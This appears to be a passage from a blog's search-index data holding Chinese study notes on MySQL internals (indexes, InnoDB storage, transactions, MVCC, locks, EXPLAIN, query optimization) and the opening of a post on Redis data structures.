操作更加高效。\n\n索引的作用\n\n对于满足索引使用条件的语句，可以起到加速查询的作用。\n如果ORDER BY子句中使用了索引列，且满足索引的使用条件（排序顺序和索引列的顺序一致，索引列左边的连续的列为常量就可以对右边的列进行排序，等），就会省去在内存或磁盘中排序（文件排序，filesort）的操作。\n如果GROUP BY子句中使用了索引列，且满足索引的使用条件，就可以直接使用索引进行分组，省去在内存或磁盘中建立临时表进行分组的操作。\n\n索引的代价\n\n创建索引需要消耗存储空间。\n每当对表中的数据进行增删改操作时，都需要修改各个B+树的索引，存在时间代价。\n生成执行计划时需要计算使用不同索引执行查询所需的成本，最后选择成本最低的那个索引执行查询，如果索引过多，可能会导致成本分析时间加长。引不适用的条件索引列上有函数，不满足最左前缀，使用了不等号，使用了范围查询等等索引的分类B-Tree索引， Hash索引，全文索引，单值索引、唯一索引、复合索引聚簇索引、非聚簇索引等等，\n\n索引的正确、高效的使用方式\n\n只为用于搜索、排序或分组的列创建索引。\n考虑索引列中重复值的个数占比，如果重复值太多，则需要大量的回表操作，不适合使用索引。\n索引列的类型占用的存储空间尽量小，因为索引占用的存储空间越小，在一个数据页内就可以存放更多的记录，磁盘I&#x2F;O带来的性能消耗也就越小。\n可以为列前缀建立索引，如果需要建立的索引类型需要很大的存储空间，则可以只对该类型的列的前几个字符建立索引。语法是在建立索引时，在建立索引的列后使用括号指定建立的索引的字符的长度。\n尽量使用覆盖索引（covering index ，又称索引覆盖），即在查询时尽量使需要返回的内容最多只包含索引和主键，以避免回表，从而提高查询速度。\n让索引列以列名的形式在搜索条件中单独出现。例如对于SELECT id FROM table_name WHERE index_column_name * 2 &lt; 4 ;和SELECT id FROM table_name WHERE index_column_name &lt; 4 / 2;，这两个语句中，前一个语句不能使用索引，但是后一个可以。这个是因为在前一个查询语句中，index_column_name列不是单独以列名的形式出现的，而是以列名*2的表达式的形式出现的，MySQL会直接认为这个搜索条件不能使用索引。\n在新插入记录时尽量让记录的主键递增。如果新插入记录的主键是依次递增的话，则每插入一个数据页就会换到下一个数据页继续插入；如果新插入的记录的主键值忽大忽小，就会增大页面分裂的概览，在页面分裂时需要将页中的一些记录移动到新创建的页中，带来性能损耗。\n\n表空间、段、区、页之间的关系表空间（Tablespace）、段（Segment）、区（Extend）、页（Page）是InnoDB中数据存储中的概念。\n表空间和页的关系是，表空间文件由许多固定大小的页组成。有不同类型的页面可用于不同的目的，示意图如下：\n\n 表空间、区、页的关系是，区是表空间内连续页的集合。区是大小为 1 MB。因此，如果页面大小为 16Kb，则一个区段中有 64 个页面，示意图如下：\n\n段、页、区的关系\n段是逻辑上的概念，是页面和区的集合，示意图如下：\n\n\nFRAG ARRAY（碎片页数组）\n分配给该段的页组成的数组（共32 个页）。\n\nNOT FULL LIST（未满的区链表）\n指向由未满的区（有至少一个空闲页的区，空闲页是未使用的数据页）组成的链表，即NOT FULL链表中的每个区都没有空闲页。\n\nFULL LIST（满的区链表）\n指向由满的区（没有空闲页的区）组成的链表，即FULL链表中的每个区都没有空闲页。\n\nFREE LIST（空闲区链表）\n指向由空闲区（每个页面都是空闲页的区）组成的链表，即FREE链表的所有页都是空闲页。\n\n\n段为索引段，数据段，回滚段等。其中索引段就是非叶子结点部分，而数据段就是叶子结点部分，回滚段用于数据的回滚和多版本控制。\n表的连接连接的本质\n从本质上说，连接就是把各个表中的记录取出来进行匹配，并产生结果集，如果不加任何过滤条件，产生的结果集就是笛卡尔积。\n嵌套循环连接算法和基于块的嵌套循环连接算法\n嵌套循环连接算法（Nested-Loop Join Algorithm，简称NLJ Algorithm）的基本思想是，每次从循环中的第一个表中读取一行，将每一行传递给一个嵌套循环，该嵌套循环处理连接中的下一个表。只要有剩余的表要连接，这个过程就会重复多次。\n嵌套循环连接算法的原理示例：\n假设对三个表t1，t2和t3使用了连接，且连接类型分别如下所示：\nTable   Join Typet1      ranget2      reft3      ALL\n\n如果使用了嵌套循环连接算法，则连接过程如下所示：\nfor each row in t1 matching range &#123;  for each row in t2 matching reference key &#123;    for each row in t3 &#123;      if row satisfies join conditions, send to client    &#125;  &#125;&#125;\n\n因为嵌套循环连接算法每次只从外循环中向内循环传递一条记录，所以通常会多次读取在内循环中处理的表，可以为内循环表（被驱动表）建立合适的索引以加快查询速度。\n如果驱动表的结果集中记录较多，导致读取被驱动表的次数很多，可以使用基于块的嵌套循环连接算法（Block Nested-Loop Join Algorithm，简称BNLJ Algorithm），该算法对外循环表（驱动表）中读取的行的进行缓存来减少必须读取内循环表的次数。例如，如果将驱动表的结果集中的N行读取到缓冲器中，并且将缓冲器传递到下一个内循环，则可以将内循环中读取的每一行与缓冲器中的所有N行进行比较。这将使必须读取内部表的次数减少N倍。\nBuffer Pool缓冲页\nBuffer Pool是MySQL向操作系统申请的在内存中的一块内存区域，可以通过启动选项buffer_pool_size进行配置（单位是字节），默认大小是128MB。\nBuffer Pool中的内存区域以页面为单位进行划分，页面大小和InnoDB表空间中使用的页面大小一致，默认都是16KB，Buffer Pool中的页称为缓冲页，每个缓冲页都有一个对应的控制块，存储了缓冲页的一些信息，如缓冲页的地址、表空间、页号。\n缓冲页哈希\nInnoDB中定位到指定表空间和页号的缓冲页所在的位置的实现方法是，以表空间+页号作为key，以缓冲页的控制块作为value，就可以通过先定位到控制块（如果内存中已经有缓冲页的话），然后再由控制块的缓冲页的地址信息定位到缓冲页。\n一些常见的链表类型及其管理方式\n\nfree链表\n\n  free链表（空闲链表）是存放所有空闲的缓冲页对应的控制块的链表。\n  free链表有一个对应的基节点，里面包含了链表的头节点地址、尾节点地址，以及链表中节点的数量等信息。\n\nflush链表\n\n  flush链表是存放了脏页（dirty page，被修改过的缓冲页）对应的控制块的链表。\n\nLRU链表\n\n  LRU（Least Recently Used）链表管理了非空闲的缓冲页，当Buffer Pool中不再有空闲的缓冲页时，就会淘汰掉最近很少使用的部分缓冲页。\n  InnoDB中的LRU链表是按照一定比例分成两截的：一部分存储使用频率非常高的缓冲页，这一部分链表也被称为热数据，或者young区域；另一部分存储使用频率不高的缓冲页，这一部分链表也被称为冷数据，或者old区域。对于old区域，如果访问的间隔时间大于系统变量innodb_old_blocks_time的设定值就会被移动到young区域。\n事务概念事务的4个特性（ACID，acid（辅助记忆）：酸）：\n\n原子性（Atomic）：要么全做，要么全不做\n隔离性（Isolation）：不同事务之间不会互相影响\n一致性（Consistency）：满足一致性需求，如转账前后总金额不变\n持久性（Durability）：事务的执行结果能够得到永久的保留（存储到了磁盘上）\n\n状态MySQL中根据操作的阶段把事务分为了以下几种状态：\n\n活动的（active）：事务正在执行。\n部分提交的（partially committed）：事务操作执行完成，但是执行结果尚保留在内存中，还没有进行持久化。\n失败的（failed）：事务在活动的和部分提交的两种状态下遇到了错误，并且无法继续执行或回滚。\n中止的（aborted）：事务在执行到中途遇到了错误，并且执行了回滚操作。\n提交的（committed）：如果事务处于部分提交状态，并且持久化成功。\n\n隔离问题\n脏写（Dirty Write）：如果一个事务修改了另一个未提交的事务修改过的数据，就意味着发生了脏写（写写）。\n脏读（Dirty Read）：如果一个事务读到了另一个未提交的事务修改过的数据，就意味着发生了脏读（读写）。\n不可重复读（No-Repeatable Read）：如果一个事务修改了另一个未提交的事务读取的数据，就意味着发生了不可重复读（写读）。\n幻读（Phantom）：如果一个事务先根据某些搜索条件查询出一些记录，在事务未提交时，另一个事务写入了一些数据导致符合搜索条件的记录发生变化，就意味着发生了幻读（读写）。\n\n隔离级别对四种隔离问题按照导致的一致性问题的严重性排序：脏写&gt;脏读&gt;不可重复读&gt;幻读。\nSQL标准中有针对这四种隔离问题的四种隔离级别（都能避免脏写）：\n\nREAD UNCOMMITED（未提交读）：隔离级别最低，不能避免脏读、不可重复读、幻读。\nREAD COMMITED（已提交读）：不能避免不可重复读和幻读。\nREPEATABLE READ（可重复读）：不能避免幻读。\nSERIALIZABLE（可串行化）：隔离级别最高，四种隔离问题都能避免。\n\nMySQL支持这四种隔离级别，默认的隔离级别是REPEATABLE READ。\nMVCC版本链是由记录的roll_pointer隐藏列连接（指向之前版本的记录）而成的记录链，记录中的另一个隐藏列trx_id就是记录的版本。\nMVCC（Multi-Version Concurrency Control，多版本并发控制）是利用记录的版本链来控制并发事务访问相同记录时的行为。\n在允许读取记录的旧版本的情况下，读写和写读操作可以使用MVCC。\nReadView（一致性视图）用于判断版本链中哪些版本是当前事务可见的（是否可以使用），ReadView包含4个重要的内容：\n\nm_ids：在生成ReadView时，当前系统中活跃的事务的事务id列表。\nmin_trx_id：在生成ReadView时，当前事务中活跃的事务中最小的事务id，即m_ids列表中的最小值。\nmax_trx_id：在生成ReadView时，下一个事务应该被分配的事务id（按照自增的规则生成事务id）。\ncreator_trx_id：生成ReadView的事务的事务id。\n\n使用ReadView并根据下列规则，判断当前事务是否可以使用某个版本的记录：\n\n如果被访问的记录的版本（trx_id值）等于ReadView中的creator_trx_id值，意味着当前事务访问自己修改过的记录，所以当前事务可以访问该版本的记录。\n如果被访问的记录的版本小于ReadView中的min_trx_id值，意味着生成该版本记录的事务已经提交，所以当前事务可以访问该版本的记录。\n如果被访问的记录的版本大于ReadView中的max_trx_id值，意味着生成该版本记录的事务还未提交，所以当前事务不能访问该版本的记录。\n如果被访问的记录的版本介于min_trx_id和max_trx_id之间，则需要判断记录的版本trx_id值，是否在m_ids列表中。如果在，说明生成该版本记录的事务还未提交，则当前事务不能访问该版本的记录；如果不在，说明生成该版本记录的事务已经提交，则当前事务可以访问该版本的记录。\n\n二级索引与MVCC：只有在聚簇索引记录中才有trx_id和roll_pointer隐藏列，如果查询语句是使用二级索引来执行查询，则判断可见性的方法是，首先跟二级索引页面的PAGE_MAX_TRX_ID（位于Page Header中，该参数记录了二级索引页面中的最大事务id）进行比较，如果当前事务id大于PAGE_MAX_TRX_ID，说明该页面中的所有记录都对当前事务可见，否则就需要执行回表，得到聚簇索引的记录之后再根据前述ReadView的判断规则判断是否可见。\n锁锁的应用\n任何一种隔离级别都会避免脏写，实现方式就是对被访问的记录加锁。\n在不允许读取记录的旧版本的情况下，读写和写读操作不能使用MVCC，而是需要使用锁。\n锁的类别\nMySQL中的锁分共享锁（Shared Lock，S锁）和独占锁（Exclusive Lock，X锁）。\n锁定读的语句\n\n对读取的记录加S锁\n在SELECT语句后面加上LOCK IN SHARE MODE：\nSELECT ... LOCK IN SHARE MODE;\n\n对读取的记录加X锁\n在SELECT语句后面加上FOR UPDATE：\nSELECT ... FOR UPDATE;\n\n写操作的原理\n\nDELETE：\n定位到记录的位置后，获取记录的X锁，最后执行删除操作（包括delete mark和添加到垃圾链表等操作）。\n\nUPDATE：\n\n如果未修改记录的主键，且被更新的列占用的存储空间在修改前后未发生变化，则获取记录的X锁后直接在原记录的位置进行修改。\n否则，先对原记录执行删除原记录（DELETE操作）和插入新纪录（INSERT操作）的操作。\n\n\nINSERT\n插入新记录。\n\n\n行锁的类型\n\nRecord Lock：只给记录加锁\nGap Lock：给记录前面的间隙加锁\nNext-Key Lock：给记录和记录前面的间隙加锁，相当于Record Lock和Gap Lock的结合\nInsert Intention Lock：处于等待状态的需要在某个存在Gap Lock或Next-Key Lock的间隙插入记录的事务也会在内存中生成的，用来表明插入意图的锁\n隐式锁：隐式锁就是不加锁。隐式锁主要用在插入场景中。在Insert语句执行过程中，必须检查两种情况，一种是如果记录之间加有间隙锁，为了避免幻读，此时是不能插入记录的，另一中情况如果Insert的记录和已有记录存在唯一键冲突，此时也不能插入记录。除此之外，Insert语句的锁都是隐式锁，但跟踪代码发现，Insert时并没有调用lock_rec_add_to_queue函数进行加锁， 其实所谓隐式锁就是在Insert过程中不加锁。\n\n日志Redo LogRedo Log（重做日志，Redo日志）是记录了已提交事务对数据库的修改的日志。\nRedo日志的用途：事务在提交前，需要将相关修改操作记录到redo日志中的，系统因崩溃而重启时需要按照redo日志重新更新数据页。\nUndo LogUndo Log（撤销日志，Undo日志）是记录了数据库中的数据被修改前的状态的日志。\nUndo日志的用途：用于保证事务的原子性，如果事务在执行过程中被取消，就将数据库依照undo日志恢复到原来的状态，这个操作叫做回滚。\nBinary LogBinary Log（二进制日志），也称为binlog，\nbinlog的用途：\n\n主从复制：数据库源服务器上将binlog发送给数据库副本服务器（下文简称副本），副本通过执行binlog复制源服务器上的数据。\n数据备份和恢复：通过创建binlog对数据进行备份，在需要的时候通过执行binlog恢复备份。\n\nEXPLAIN使用EXPLAIN能够输出语句的执行信息，使用方法是在查询语句前加EXPLAIN关键字。\nEXPLAIN输出格式\n\n\nColumn\nJSON Name\nMeaning\n解释\n\n\n\nid\nselect_id\nThe SELECT identifier\n标识符\n\n\nselect_type\nNone\nThe SELECT type\n查询类型\n\n\ntable\ntable_name\nThe table for the output row\n表名\n\n\npartitions\npartitions\nThe matching partitions\n匹配的分区\n\n\ntype\naccess_type\nThe join type\n访问方法\n\n\npossible_keys\npossible_keys\nThe possible indexes to choose\n可能用到的索引\n\n\nkey\nkey\nThe index actually chosen\n实际用到的索引\n\n\nkey_len\nkey_length\nThe length of the chosen key\n索引的长度\n\n\nref\nref\nThe columns compared to the index\n与索引进行等值匹配的列信息\n\n\nrows\nrows\nEstimate of rows to be examined\n预计需要读取的记录条数\n\n\nfiltered\nfiltered\nPercentage of rows filtered by table condition\n经过搜索条件过滤后剩余记录条数占rows数量的百分比\n\n\nExtra\nNone\nAdditional information\n一些额外的信息\n\n\n果查询语句（包括子查询语句）有多条，或在一个查询语句中使用了多张表，或执行计划中使用了临时表，EXPLAIN的输出结果就会有多条，在EXPLAIN输出的多行结果中，不同的id代表不同的查询语句，相同的id代表相同查询语句的不同表，id为NULL时代表临时表。\n查询类型\n\n\nselect_type Value\nMeaning\n解释\n\n\n\nSIMPLE\nSimple SELECT (not using UNION or subqueries)\n查询语句中不包含UNION、UNION  ALL或子查询的查询都算是SIMPLE类型。\n\n\nPRIMARY\nOutermost SELECT\n对于包含UNION、UNION  ALL或者子查询的查询来说，最左边的查询的查询类型就是PRIMARY。\n\n\nUNION\nSecond or later SELECT statement in a UNION\n对于包含UNION或者UNION  ALL的查询来说，除最左边的查询之外的子查询的查询类型都是UNION。\n\n\nUNION RESULT\nResult of a UNION.\n对于包含UNION的查询来说，被用来做去重的临时表的查询类型就是UNION RESULT。\n\n\nDEPENDENT UNION\nSecond or later SELECT statement in a UNION, dependent on outer query\n是使用了UNION或UNION  ALL，且依赖外部查询中的数据来执行其操作的子查询。\n\n\nSUBQUERY\nFirst SELECT in subquery\n提示了子查询语句是否使用半连接转换以及允许使用哪些半连接策略，以及在不使用半连接时，是否使用子查询物化或IN到EXISTS转换。格式见官网。\n\n\nDEPENDENT SUBQUERY\nFirst SELECT in subquery, dependent on outer query\n是依赖外部查询中的数据来执行其操作的子查询。\n\n\nDERIVED\nDerived table\n派生表，是指在查询语句中使用子查询生成的临时表。\n\n\nDEPENDENT DERIVED\nDerived table dependent on another table\n依赖外部查询中的数据来执行其操作的派生表。\n\n\nMATERIALIZED\nMaterialized subquery\n物化表。\n\n\nUNCACHEABLE SUBQUERY\nA subquery for which the result cannot be cached and must be re-evaluated for each row of the outer query\n不能缓存其结果的子查询，必须对外部查询的每条记录重新查询。\n\n\nUNCACHEABLE UNION\nThe second or later select in a UNION that belongs to an uncacheable subquery (see UNCACHEABLE SUBQUERY)\n使用了UNION或UNION  ALL，且不能缓存其结果的子查询，必须对外部查询的每条记录重新查询。\n\n\n访问方法\n\n\n访问方法名\n常见的搜索条件\n解释\n\n\n\nconst\nUtilize PRIMARY KEY or UNIQUE index to constant values using the = operator.\n主键或唯一索引列与常数进行等值比较。\n\n\nref\nThe comparison value can be either a constant or an expression that utilizes the PRIMARY KEY or UNIQUE index when using the = or &lt;=&gt; operator.\n使用主键和唯一索引列进行等值比较或&lt;&#x3D;&gt;比较\n\n\neq_ref\nThe comparison value can be either a constant or an expression that utilizes the PRIMARY KEY or UNIQUE NOT NULL index when using the = operator.\n使用主键和唯一非NULL索引列进行等值比较或表达式比较\n\n\nref_or_null\nThis join type is like ref, but with the addition that MySQL does an extra search for rows that contain NULL values.\n类似ref，但多了一个或IS NULL的比较\n\n\nrange\nrange can be used when a key column is compared to a constant using any of the =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, LIKE, or IN() operators\n当使用任何&#x3D;、&lt;&gt;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、is NULL、&lt;&#x3D;&gt;、BETWEEN、LIKE或IN()运算符将键列与常量进行比较时，可以使用范围\n\n\nindex\nThe index join type is the same as ALL, except that the index tree is scanned.\nindex扫描方法是扫描全部二级索引记录的访问方法。一般是在索引包含搜索条件和完整的返回结果的情况下使用，因为这种情况下扫描全部二级索引比扫描全部聚簇索引的耗时小。\n\n\n\nThis type replaces eq_ref for some IN subqueries.\n替换IN子查询下的eq_ref\n\n\nindex_subquery\nThis join type is similar to unique_subquery. It replaces IN subqueries, but it works for nonunique indexes in subqueries.\n类似unique_subquery，不同的是索引不是非唯一的\n\n\nfulltext\nThe join is performed using a FULLTEXT index.\n使用全文索引\n\n\nindex_merge\nThis join type indicates that the Index Merge optimization is used.\n表示使用了索引合并\n\n\nall\nA full table scan is done for each combination of rows from the previous tables.\n使用了全表扫描。\n\n\n索引合并分三种：\n\nIntersection\nIntersection（交集）合并方式的应用示例：\nSELECT * FROM table_name WHERE column_name1 = &#x27;a&#x27; AND column_name2 = &#x27;b&#x27;;\n\n其中column_name1和column_name2列都已建立索引。使用Intersection合并方式意味着使用column_name1和column_name2进行查询，得到有序的主键，再取交集，对交集中的主键执行回表操作。取交集的好处是，避免了对不满足条件的主键值执行回表操作。\n使用Intersection的条件是，从每个索引中获取到的二级索引的主键值是有序的。\n索引得到的主键值是有序的有两个好处：\n\n从两个有序集合中取交集比从两个无序集合中取交集要容易；\n如果主键值是有序的，则根据这些主键值执行回表操作时就不再是进行单纯的随机I&#x2F;O，从而提高效率。\n\n\nUnion\nUnion（并集）合并方式的应用示例：\nSELECT * FROM table_name WHERE column_name1 = &#x27;a&#x27; OR column_name2 = &#x27;b&#x27;;\n\n其中column_name1和column_name2列都已建立索引。使用Union合并方式意味着使用column_name1和column_name2进行查询，得到有序的主键，再取并集，对并集中的主键执行回表操作。取并集的好处是，避免了对满足条件的主键值重复执行回表操作。\n使用Union的条件是，从每个索引中获取到的二级索引的主键值是有序的。\n索引得到的主键值是有序的有两个好处：\n\n对两个有序集合中去重比对两个无序集合中去重要容易；\n同index_merge。\n\n\nSort-Union\nSort-Union（排序后取并集）合并方式比Union多了一个对二级索引记录的主键值排序的操作。\n\n\nkey_len的计算\n对于固定长度的类型来说，key_len就是就是数据类型的字节长度，如INT类型的索引的key_len的基础值是4。\n对于变长的类型来说，是类型定义的最长长度乘以字符类型长度，如使用了utf8mb4的类型为VARCHAR(100)的列key_len的基础值是4*100&#x3D;400。\n\n之所以称为是key_len的基础值，是因为在部分情况下key_len会在基础值上加几个字节：\n\n对于可以存储NULL值的索引列，会在key_len的基础值上加1个字节。\n对于变长类型，会在key_len的基础值上加2个字节。\n\nref当访问方法是const、eq_ref、ref、ref_or_null、unique_subquery、index_subquery中的一个时，ref展示的就是与索引进行等值匹配的列信息。如果不是这些访问方法中的一个，则ref显示NULL。\nJSON格式的执行计划EXPLAIN输出的信息中没有执行计划的成本，通过在EXPLAIN和查询语句之间添加FORMAT=JSON可以实现输出包含成本的执行计划。\nSHOW WARNINGS在使用EXPLAIN语句查看了某个查询的执行计划之后，紧接着还可以使用SHOW WARNINGS语句来查看查询的执行计划的扩展信息，其中包含查询优化器将查询语句重写后的语句，只是该语句不是标准的查询语句。\noptimizer trace如果打开optimizer trace功能，则执行查询语句，或使用EXPLAIN查看查询语句的执行计划后，就会在information_schema数据库下的OPTIMIZER_TRACE来查看完整的执行计划生成和执行的过程。optimizer trace输出的信息大致包含将优化过程分为了三个阶段，perpare阶段、optimize阶段、execute阶段。基于成本的优化集中在optimize阶段，对于单表查询来说，主要关注optimize阶段的rows_estimation过程，该过程写明了对各种不同的执行方案对应的成本；对于多表查询来说，主要关注optimize阶段的considered_execution_plans过程，该过程写明了各种不同的表连接顺序对应的成本。\n建立合适的索引查询的成本MySQL中查询语句的执行成本由两个方面组成，I&#x2F;O成本和CPU成本：\n\nI&#x2F;O成本：InnoDB存储引擎是将数据页存储在磁盘上，当查询表中的记录时，需要先把数据页加载到内存中，这个过程中消耗的时间称为I&#x2F;O成本。\nCPU成本：检测记录是否满足对应的搜索条件、对结果集进行排序等操作消耗的时间称为CPU成本。\n\n单表查询的成本\n在对单表查询生成执行计划前，MySQL的优化器会找出并对比不同的执行方案，从而找出成本最低的执行方案，这一过程的具体步骤是：\n\n根据搜索条件，找出所有可能使用的索引。\n计算全表扫描的执行成本。\n计算使用不同索引执行查询的执行成本。\n对比不同执行方案的执行成本，找出成本最低的那个方案。\n\nInnoDB对查询的自动优化查询优化器会对查询进行自动的优化，优化方法如下：\n\n条件简化\n\n移除不必要的括号\n常量传递\n替换永远为TRUE或FALSE条件\n表达式计算\n合并没有使用聚合函数及GROUP BY子句的SQL语句中的HAVING和WHERE子句\n常量表检测，此处的常量表指的是表中没有或者只有一条记录、使用主键或唯一二级索引进行等值匹配作为搜素条件，因为这两种查询花费的时间很小，所以把通过这两种查询方式查询的表称为常量表（constant table）\n\n\n外连接消除\n\n在空值拒绝的条件下外连接可以转换为内连接，通过将外连接转换为内连接，就可以使用内连接的执行优化方法。空值拒绝（reject-NULL）指的是，在外连接查询中，WHERE子句中包含被驱动表中的列不为NULL值的条件。\n\n\nIN子查询优化\n\n对可以转化为内连接的查询的IN子查询的结果建立物化表，并使用内连接的执行优化方案。\n物化表：对子查询的结果集建立基于内存临时表+哈希索引，或基于磁盘的临时表+B+树索引，此处的临时表被称为物化表，数据添加到物化表中时一般会去重。如果子查询的结果集过大导致超过了系统变量tmp_table_size或者max_heap_table_size的值，则基于内存的临时表会转换为基于磁盘的临时表，并转换索引类型。\n\n如果IN子查询符合转换为半连接（SEMI JOIN）的条件，会将该子查询转换为半连接。\n转换方法包括以下几种：\n\n子查询中的表上拉（Table pullout）\n当子查询的查询列表中有主键或者唯一索引列的查询条件时，可以直接把子查询中的表上拉到外层查询的FROM子句中\n\n松散扫描（LooseScan）\n如果搜索条件中的某一列建立了索引，并且能够使用索引，那么只需要对该列的多个同样的值执行一次匹配即可。\n\n……\n\n\n两种IN子查询优化方法的使用顺序是，优先使用转换为半连接的方法，如果IN子查询不符合转换为半连接的条件，才会使用将IN子查询物化的方法。\n\n\n\n\n性能调优调优可以提高数据库的性能和吞吐量。以下是一些MySQL调优的方法：\n\n优化查询语句\n\n\n使用合适的索引：对于经常用于检索的列，创建索引可大幅提升查询效率；\n避免使用SELECT *：只选取必要的列可以减少数据传输和磁盘I&#x2F;O；\n使用EXPLAIN命令查看查询执行计划：通过观察查询计划，可以了解到查询过程中哪些步骤需要优化。\n\n\n调整服务器参数\n\n\n修改MySQL缓冲区大小：将innodb_buffer_pool_size设置为合理的大小，以便在缓存中保留更多的数据；\n调整处理器缓存和线程池：根据服务器的硬件规格和应用程序类型，适当增加线程池大小和处理器缓存大小，以提高并发处理能力；\n修改文件系统缓存大小：根据服务器的硬件和操作系统，可以修改磁盘缓存大小；\n\n\n优化表结构设计\n\n\n使用恰当的数据类型：为每个列选择最小、最合适的数据类型可以减少磁盘空间和内存开销，提高查询速度；\n避免使用太多的JOIN：JOIN操作需要较多的CPU和内存资源，应尽可能减少其使用；\n分解大的表：当一个表中包含大量数据时，可以考虑将其分解为多个较小的表，以提高查询和更新效率。\n\n\n监控数据库性能\n\n\n使用SHOW STATUS或SHOW GLOBAL STATUS命令查看MySQL性能统计信息；\n采用监控工具进行实时监控，如Nagios、Zabbix等。\n\n总而言之，在调优MySQL时需要综合考虑硬件、操作系统、数据库参数等各方面因素，对于常见的优化点进行一一梳理和测试，以找到最佳配置参数。\nReferences\n西泽梦路. MySQL基础教程. 北京: 人民邮电出版社, 2020.1.\n小孩子4919. MySQL是怎样运行的：从根上理解MySQL. 北京：人民邮电出版社, 2020.11.\n\n","categories":["IT"],"tags":["MySQL"]},{"title":"Redis","url":"/2023/05/06/Redis/","content":"基础基础数据结构5种基础数据结构string（字符串）Redis的string是动态字符串，可以被修改，内部实现结构类似于Java的ArrayList，采用预分配冗余空间的方式来减少内存的频繁分配，如果字符串长度小于1MB，扩容方式是加倍现有的空间，如果字符串长度超过1MB，扩容方式是只多扩1MB的空间。\nRedis所有数据结构都以唯一的key字符串作为名称\n一个常见的用途是缓存用户信息，将用户信息序列化成字符串，存入Redis缓存，取出用户信息的时候会经过一次反序列化的过程\nmset、mget命令可以实现对多个字符串进行批量读写\nex后缀可以在set的时候指定过期时间\nnx后缀可以在set的时候设置条件，如果key不存在才set\nlist（列表）Redis的列表相当于Java的LinkedList，是双向链表，不是数组。\n当 List 中的元素数量较少且元素都比较短时，Redis 通常会采用 ziplist 来存储；多个ziplist之间使用双向指针串联起来（避免在插入或删除数据时产生大量的内存拷贝），这种结构叫做quicklist（快速链表）。\nziplist （压缩列表）是一个特殊的双向链表（本质上是一个字节数组）。ziplist的优点是节省内存，原因是使用了紧凑的内存布局，具体表现在：\n\nziplist中的元素是连续存储的（内存分配是连续的），只需要对整个ziplist（整个ziplist包含了多个数据）进行内存对齐。\n没有使用双向指针，而是使用了Prevlen（前一个entry的长度，entry是存储数据的节点）和Entrylen（当前姐节点的长度），通过长度推算元素位置。使用Prevlen和Entrylen的内存消耗通常比使用双向指针要小，因为一个listNode指针固定占用4字节（32位操作系统下）或8字节（64位操作系统下）。\n没有使用ListNode作为存储实际数据的节点，除了Prevlen、Entrylen和Content（实际数据）外，没有其它组成部分（如内存对齐）会消耗内存。\n\nlist常用来做异步队列使用，使用方法是将需要延后处理的任务序列化成字符串放入列表。\n支持的命令有：rpush、rpop、lpush、lpop、lindex、lrange、ltrim\nhash（字典）相当于Java中的HashMap，跟HashMap一样，底层也是数组+链表的实现方式，不同的是Redis的hash的值只能是字符串，且rehash的方式也不一样，rehash 是指在哈希表发生扩容时进行的重新哈希操作。扩容过程包括创建新的哈希表、将旧哈希表的元素 rehash 到新哈希表中，redis采用了渐进式哈希扩容的策略，通过分多次操作逐步完成整个扩容过程，避免服务阻塞的问题。\n具体来说，Redis 的哈希表扩容过程如下：\n\n创建新哈希表：系统会根据当前数据库的元素数量和设置的负载因子计算出扩容所需的最小桶数，然后创建一个新的哈希表，将其指针保存在旧哈希表的 rehashidx 属性中。\n\n逐步 rehash 元素：从旧哈希表中取出一个桶（或一个链表），并将其中的元素 rehash 到新哈希表中，如果新哈希表中的相应桶为空，则直接插入元素；如果不为空，则使用链表结构将其作为链表头插入。这个过程需要遍历旧哈希表中所有的非空桶，每次操作都只处理一个桶中的元素，避免一次性处理过多数据。\n\n完成 rehash：当旧哈希表中的所有元素都被 rehash 到新哈希表后，会释放旧哈希表占用的内存。\n\n\n支持的命令有：hset、hget、hlen、hgetall等\nset（集合）Redis的集合set相当于Java的HashSet，是无序的，内部实现相当于一个特殊的字典，字典中所有的value都是NULL。\n支持的命令有：sadd、scard、sismember等，scard用于获取计数值。\nzset（有序集合）类似于Java中的SortedSet和HashMap的结合体，同样是key-value结构，不同的是zset的value不是一个值，而是member和score两个值（可理解为member-score键值对），member是不重复的，按照score进行排序。底层实现使用的是跳表。\nzset可以用来存储粉丝列表，value是粉丝的用户id，score是关注时间，按照关注时间排序，类似的，还可以用来存储学生的成绩。\nzset支持的操作：\n\nzadd：向有序集合添加一个或多个成员，并指定对应的分数。\nzrank：获取成员在有序集合中的排名（从小到大）。\nzrevrank：获取成员在有序集合中的倒序排名（从大到小）。\nzrange：按照排名范围获取有序集合中的成员。\nzrevrange：按照倒序排名范围获取有序集合中的成员。\nzscore：获取成员的分数。\nzincrby：增加成员的分数。\nzrem：从有序集合中移除一个或多个成员。\nzcard：获取有序集合元素的总和\n\n容器型数据结构的两条规则list、set、hash、zset这四种数据结构都是容器型数据结构，容器型数据结构遵从两条规则：\n\ncreate if not exists：如果添加元素时容器不存在，就创建。\ndrop if no elements：如果容器里没有元素，那么立即删除容器释放内存。\n\n过期时间Redis中所有对象都可以设置过期时间。例如，可以对一个hash对象设置过期时间，但是不能对齐某一个key-value设置过期时间。\n需要注意的是，如果一个对象已经设置了过期时间，然后调用set修改了这个对象，那么之前设置是过期时间就会失效。\n其它数据结构位图对于一些需要存储大量bool型数据的情况（比如一年内的签到数据），如果使用普通的key-value，存储空间消耗极大。为解决这个问题，Redis提供了位图数据结构（不是全新的数据结构，底层其实是string字符串）。位图的最小单位是比特（0或1）。\n支持的命令有：getbit、setbit、bitcount、bitpos、bitfield等\n其中bitcount和bitpos命令是位图的统计命令，bitcount用来统计指定范围内1的个数、bitops用来查找指定范围内出现的第一个0或1的位置。\nbitfield命令可以实现一次性对指定位片段进行多位操作，bitfield有三个子命令，get、set、incrby。如果使用incrby命令时出现了溢出，Redis默认的处理方式是折返（wrap），即不对溢出进行特殊处理，溢出之后是什么值就取什么值。Redisbitfield命令的选择溢出策略的子命令是overflow，用户可以选择溢出行为，包括折返、失败（fail，报错并不予执行）、饱和截断（sat，超过了范围就停留在最大或最小值）。\n常用的使用方式有：零存（对位值逐个设置）整取、零存零取、整存（使用字符串一次性填充所有位）零取。\nHyperLogLog要统计网站上每个网页每天的UV数据总数，数据不需要太精确。由于统计UV需要去重，所以简单的方案是使用set，但是如果页面访问量很大，就存在浪费存储空间的问题。更好的解决方案是使用HyperLogLog，HyperLogLog 使用的内存消耗最多是12 KB，无论估算的基数有多大，它始终只占用 12 KB 